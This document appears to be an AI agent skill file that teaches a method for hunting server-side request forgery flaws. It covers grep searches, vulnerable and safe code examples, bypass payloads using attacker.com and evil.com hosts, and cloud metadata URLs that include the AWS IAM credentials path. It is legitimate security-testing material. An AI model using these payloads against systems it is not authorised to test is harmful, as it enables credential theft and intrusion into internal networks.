---
name: hunt-ssrf
description: >
  Learned technique for finding SSRF
  (Server-Side Request Forgery) vulnerabilities.
  Refined 1 time. Last success: 2026-04-13.
allowed_tools:
  - Agent
  - Read
  - Grep
  - Glob
  - Bash
  - WebFetch
  - WebSearch
when_to_use: >
  Use when looking for SSRF vulnerabilities.
  Trigger: "hunt for SSRF", "check for SSRF",
  "find request forgery", "test URL fetching"
---

# Hunt: SSRF (Server-Side Request Forgery)

## Success Rate
- Times used: 1
- Vulns found: 1
- Last refined: 2026-04-13
- Avg severity: Critical (CVSS 9.1)

## Technique

### Step 1: Find URL Input Points

Look for endpoints that accept URLs or
fetch external resources:

```bash
# Backend URL fetching patterns
grep -rn "fetch\|axios\|request\|urllib\|httpClient\|curl_exec\|file_get_contents\|HttpURLConnection" \
  --include="*.js" --include="*.ts" \
  --include="*.py" --include="*.java" \
  --include="*.php" .

# URL parameters in routes
grep -rn "url=\|uri=\|path=\|dest=\|redirect=\|src=\|domain=\|host=\|fetch=\|callback=" \
  --include="*.js" --include="*.ts" \
  --include="*.py" .

# Webhook/callback endpoints
grep -rn "webhook\|callback\|notify_url\|return_url\|ping\|proxy\|preview\|render" \
  --include="*.js" --include="*.ts" \
  --include="*.py" .

# PDF/image generation from URL
grep -rn "pdf\|screenshot\|thumbnail\|avatar\|import.*url\|load.*url\|download.*url" \
  --include="*.js" --include="*.ts" \
  --include="*.py" .
```

**High-value SSRF targets:**
- Webhook registration endpoints
- URL preview / link unfurling
- PDF generation from URL
- Image proxy / avatar upload by URL
- Import from URL features
- OAuth callback URLs

### Step 2: Check for URL Validation

```bash
# Is there URL validation?
grep -rn "whitelist\|allowlist\|blacklist\|denylist\|isValidUrl\|validateUrl\|parseUrl" \
  --include="*.js" --include="*.ts" \
  --include="*.py" .

# Check if internal IPs are blocked
grep -rn "127\.0\.0\|localhost\|169\.254\|10\.\|172\.16\|192\.168\|0\.0\.0\.0\|::1" \
  --include="*.js" --include="*.ts" \
  --include="*.py" .
```

**Vulnerable pattern:**
```javascript
// BAD — no URL validation
app.post('/api/webhook', (req, res) => {
  const { url } = req.body;
  fetch(url)  // attacker controls URL
    .then(r => r.text())
    .then(data => res.json({ data }));
});
```

**Safe pattern:**
```javascript
// GOOD — validates URL
app.post('/api/webhook', (req, res) => {
  const { url } = req.body;
  if (!isExternalUrl(url)) {
    return res.status(400).json({
      error: 'Invalid URL'
    });
  }
  fetch(url).then(/* ... */);
});
```

### Step 3: SSRF Bypass Techniques

If basic validation exists, test bypasses:

```
# DNS rebinding
http://attacker.com → resolves to 127.0.0.1

# URL encoding
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31

# Decimal IP
http://2130706433 (= 127.0.0.1)

# IPv6 shorthand
http://[::1] or http://[0:0:0:0:0:ffff:127.0.0.1]

# Redirect chain
http://attacker.com/redirect → http://169.254.169.254

# URL parser confusion
http://evil.com#@internal-host
http://internal-host@evil.com
```

### Step 4: Confirm SSRF Impact

Test access to internal resources:

```
# AWS metadata (most valuable)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal services
http://localhost:8080/admin
http://internal-api:3000/health

# Cloud metadata (GCP/Azure)
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance
```

### Step 5: Assess Severity

| Access | CVSS | Severity |
|--------|------|----------|
| AWS credentials via metadata | 9.8 | Critical |
| Internal admin panel | 8.5 | High |
| Internal API data | 7.5 | High |
| Port scan only | 5.3 | Medium |
| Blind (no response) | 4.3 | Medium |

## Patterns That Work

| Pattern | Context | Confidence |
|---------|---------|------------|
| `fetch(req.body.url)` | Webhook endpoints | High |
| PDF generation from URL | wkhtmltopdf, puppeteer | High |
| Image proxy `?url=` | Avatar/thumbnail | High |
| Import from URL | Data import features | Medium |
| OAuth callback manipulation | SSO integrations | Medium |

## False Positive Filters

Skip these — they look like SSRF but aren't:
- **Static redirect URLs**: hardcoded, not
  user-controlled
- **Client-side fetch**: browser fetch() can't
  reach internal services (same-origin policy)
- **Validated + resolved**: URL is validated AND
  DNS resolution is checked before request
- **Outbound-only firewall**: egress filtering
  blocks internal network access

## Changelog
- 2026-04-13: Created with comprehensive SSRF
  patterns. Covers webhook, PDF gen, image proxy,
  import, and OAuth vectors. Includes bypass
  techniques and cloud metadata targets.
